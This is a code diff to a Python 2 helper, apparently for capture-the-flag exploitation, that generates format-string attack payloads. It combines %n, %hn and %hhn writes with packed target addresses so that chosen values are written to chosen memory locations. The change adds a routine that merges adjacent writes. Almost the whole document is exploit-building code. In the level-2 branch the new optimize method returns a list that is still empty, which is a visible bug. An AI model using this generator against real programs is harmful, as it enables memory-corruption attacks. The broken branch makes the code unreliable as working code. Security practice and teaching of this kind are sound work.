@@ -17,7 +17,7 @@ def u16(x):
 
 class PercentN(object):
     write_chars = None
-    index_address = None
+    index = None
     level = None
 
     def __init__(self, level):
@@ -31,13 +31,13 @@ class PercentN(object):
 
 
     def __str__(self):
-        if self.index_address is not None:
+        if self.index is not None:
             if self.level == 2:
-                return self.write_chars.replace("xxxxx", self.index_address)
+                return self.write_chars.replace("xxxxx", str(self.index).rjust(5, "0"))
             elif self.level == 1:
-                return self.write_chars.replace("xxxx", self.index_address)
+                return self.write_chars.replace("xxxx", str(self.index).rjust(4, "0"))
             elif self.level == 0:
-                return self.write_chars.replace("xxx", self.index_address)
+                return self.write_chars.replace("xxx", str(self.index).rjust(3, "0"))
         return self.write_chars
 
 class Fmt(object):
@@ -77,8 +77,40 @@ class Fmt(object):
                 payload += str(item)
         return payload
 
-    def optimize(concat_list):
-        pass
+    def optimize(self, to_write, level):
+        tmp_to_write = []
+        new_to_write = []
+        for x in to_write:
+            x.append(level)
+        if level == 2:
+            return sorted(new_to_write, key=(lambda x: x[1]))
+        while len(to_write) > 0:
+            if len(to_write) == 1:
+                tmp_to_write.append(to_write.pop(0))
+            else:
+                # If current level is 0, check next byte
+                if to_write[0][2] == 0 and to_write[0][0] + 1 == to_write[1][0] and to_write[1][1] == 0 and to_write[1][2] == 0:
+                    to_write[0][2] = 1
+                    to_write.pop(1)
+                elif to_write[0][2] == 1 and to_write[0][0] + 2 == to_write[1][0] and to_write[1][1] == 0 and to_write[1][2] == 1:
+                    to_write[0][2] = 2
+                    to_write.pop(1)
+                else:
+                    tmp_to_write.append(to_write.pop(0))
+
+        while len(tmp_to_write) > 0:
+            if len(tmp_to_write) == 1:
+                new_to_write.append(tmp_to_write.pop(0))
+            else:
+                if tmp_to_write[0][2] == 0 and tmp_to_write[0][0] + 1 == tmp_to_write[1][0] and tmp_to_write[1][1] == 0 and tmp_to_write[1][2] == 0:
+                    tmp_to_write[0][2] = 1
+                    tmp_to_write.pop(1)
+                elif tmp_to_write[0][2] == 1 and tmp_to_write[0][0] + 2 == tmp_to_write[1][0] and tmp_to_write[1][1] == 0 and tmp_to_write[1][2] == 1:
+                    tmp_to_write[0][2] = 2
+                    tmp_to_write.pop(1)
+                else:
+                    new_to_write.append(tmp_to_write.pop(0))
+        return sorted(new_to_write, key=(lambda x: x[1]))
 
     # Build final payload
     # level: 0 => hhn   1 byte
@@ -91,11 +123,15 @@ class Fmt(object):
         self.build_table(level)
 
         # Sort the table in ascending order of value
-        to_write = sorted(self.table.items(), key=lambda x: x[1])
+        to_write = sorted(self.table.items(), key=lambda x: x[0])
+        to_write = [list(x) for x in to_write]
+
+        to_write = self.optimize(to_write, level)
 
         if debug:
             for x in to_write:
-                print hex(x[0]), hex(x[1])
+                print hex(x[0]), hex(x[1]), x[2]
+                pass
 
         # A list of splitted payload. Concating it is payload.
         to_concat = []
@@ -106,6 +142,7 @@ class Fmt(object):
 
         # Add %n$c and %n formatters
         for kv_target in to_write:
+            level = kv_target[2]
             # If previously printed, calculate num of chars to overflow
             if level == 2:
                 num_chars_to_write = (kv_target[1] - tmp_written) & (2 ** 32 - 1)
@@ -133,26 +170,9 @@ class Fmt(object):
 
         # A to_concat[i] now is either %n$c or %n
         for i in range(len(to_concat)):
-            snippet = to_concat[i]
-            if level == 2:
-                if type(snippet) is PercentN and "xxxxx" in snippet.write_chars:
-                    # Calculate where the offset of address bytes would be and replace
-                    to_concat[i].index_address = str(self.offset + self.get_length_to_concat(to_concat) / 8).rjust(5, "0")
-                    # Append the address bytes to the end
-                    to_concat.append(p64(to_write[0][0]))
-                    # Use the next address in next loop
-                    to_write.pop(0)
-            elif level == 1:
-                if type(snippet) is PercentN and "xxxx" in snippet.write_chars:
-                    to_concat[i].index_address = str(self.offset + self.get_length_to_concat(to_concat) / 8).rjust(4, "0")
-                    to_concat.append(p64(to_write[0][0]))
-                    to_write.pop(0)
-            elif level == 0:
-                if type(snippet) is PercentN and "xxx" in snippet.write_chars:
-                    to_concat[i].index_address = str(self.offset + self.get_length_to_concat(to_concat) / 8).rjust(3, "0")
-                    to_concat.append(p64(to_write[0][0]))
-                    to_write.pop(0)
-
+            if type(to_concat[i]) is PercentN:
+                to_concat[i].index = self.offset + self.get_length_to_concat(to_concat) / 8
+                to_concat.append(p64(to_write.pop(0)[0]))
         # Construct the payload
         self.payload = self.concat(to_concat)
         return self.payload
